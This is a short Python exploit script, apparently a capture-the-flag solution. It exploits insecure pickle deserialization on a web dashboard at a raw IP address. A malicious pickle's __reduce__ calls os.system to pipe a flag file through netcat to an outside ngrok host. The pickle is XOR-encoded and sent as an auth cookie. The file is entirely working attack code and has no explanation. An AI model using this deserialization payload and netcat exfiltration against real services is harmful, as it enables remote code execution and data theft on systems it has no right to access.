import requests
import pickle
from pwn import *

url = "http://34.89.213.64:31060/dashboard"


class RCE:
    def __reduce__(self):
        cmd = 'cat flag | nc 6.tcp.ngrok.io 15545'
        return os.system, (cmd,)


payload = pickle.dumps(RCE(), protocol=2)
print(payload)
key = len(payload) * "A"
auth_cookie = xor(payload, key).hex()
r = requests.get(url, cookies={"key": key, "auth_cookie": auth_cookie})
# print(r.text)
